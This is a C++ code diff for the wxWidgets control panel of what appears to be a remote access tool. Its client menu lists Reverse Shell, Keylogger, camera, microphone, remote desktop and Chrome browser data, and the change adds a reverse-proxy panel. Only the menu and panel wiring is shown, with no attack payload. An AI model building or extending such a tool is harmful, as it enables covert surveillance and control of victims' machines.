@@ -10,6 +10,7 @@
 #include "panel_wmanager.hpp"
 #include "panel_info_chrome.hpp"
 #include "panel_usuarios.hpp"
+#include "panel_reverse_proxy.hpp"
 #include "server.hpp"
 #include "misc.hpp"
 
@@ -45,29 +46,31 @@ FrameCliente::FrameCliente(std::string strID, SOCKET sckID, std::string strIP)
     
     this->m_tree = new MyTreeCtrl(pnl_Left, EnumIDS::TreeCtrl_ID,wxDefaultPosition, wxSize(180, 450), this->strClienteID, strIP, sckID);
     
-    wxTreeItemId rootC = this->m_tree->AddRoot(wxT("CLI"));
-    wxTreeItemId rootAdmin = this->m_tree->AppendItem(rootC, wxT("[Admin]"));
-    wxTreeItemId rootSurveilance = this->m_tree->AppendItem(rootC, wxT("[Spy]"));
+    wxTreeItemId rootC           = this->m_tree->AddRoot(                    wxT("CLI"));
+    wxTreeItemId rootAdmin       = this->m_tree->AppendItem(rootC,       wxT("[Admin]"));
+    wxTreeItemId rootSurveilance = this->m_tree->AppendItem(rootC,         wxT("[Spy]"));
     wxTreeItemId rootInformation = this->m_tree->AppendItem(rootC, wxT("[Informacion]"));
+    wxTreeItemId rootNetwork     = this->m_tree->AppendItem(rootC,         wxT("[Red]"));
     //wxTreeItemId rootMisc = this->m_tree->AppendItem(rootC, wxT("[Misc]")); <- Aqui ira fun
 
     this->m_tree->AppendItem(rootAdmin, wxT("Admin de Archivos"));
     this->m_tree->AppendItem(rootAdmin, wxT("Admin de Procesos"));
     this->m_tree->AppendItem(rootAdmin, wxT("Admin de Ventanas"));
-    this->m_tree->AppendItem(rootAdmin, wxT("Reverse Shell"));
-    this->m_tree->AppendItem(rootAdmin, wxT("Transferencias"));
+    this->m_tree->AppendItem(rootAdmin,     wxT("Reverse Shell"));
+    this->m_tree->AppendItem(rootAdmin,    wxT("Transferencias"));
 
     //this->m_tree->AppendItem(rootAdmin, wxT("Persistencia"));
 
-    this->m_tree->AppendItem(rootSurveilance, wxT("Keylogger"));
-    this->m_tree->AppendItem(rootSurveilance, wxT("Camara"));
-    this->m_tree->AppendItem(rootSurveilance, wxT("Microfono"));
+    this->m_tree->AppendItem(rootSurveilance,         wxT("Keylogger"));
+    this->m_tree->AppendItem(rootSurveilance,            wxT("Camara"));
+    this->m_tree->AppendItem(rootSurveilance,         wxT("Microfono"));
     this->m_tree->AppendItem(rootSurveilance, wxT("Escritorio Remoto"));
 
     this->m_tree->AppendItem(rootInformation, wxT("Usuarios"));
-
     wxTreeItemId rootBrowsers = this->m_tree->AppendItem(rootInformation, wxT("Navegadores"));
     this->m_tree->AppendItem(rootBrowsers, wxT("Chrome"));
+
+    this->m_tree->AppendItem(rootNetwork, wxT("Proxy Inversa"));
 
     //Sizer para hacer el treeview dinamico al hacer resize
     wxBoxSizer* pnl_left_Sizer = new wxBoxSizer(wxHORIZONTAL);
@@ -174,6 +177,8 @@ void MyTreeCtrl::OnItemActivated(wxTreeEvent& event) {
             this->p_Notebook->AddPage(new panelInfoChrome(this, this->sckCliente), wStr, true);
         }else if (wStr == "Usuarios") {
             this->p_Notebook->AddPage(new panelUsuarios(this, this->sckCliente), wStr, true);
+        }else if (wStr == "Proxy Inversa") {
+            this->p_Notebook->AddPage(new panelReverseProxy(this, this->sckCliente), wStr, true);
         }
 
         this->p_Notebook->Thaw();
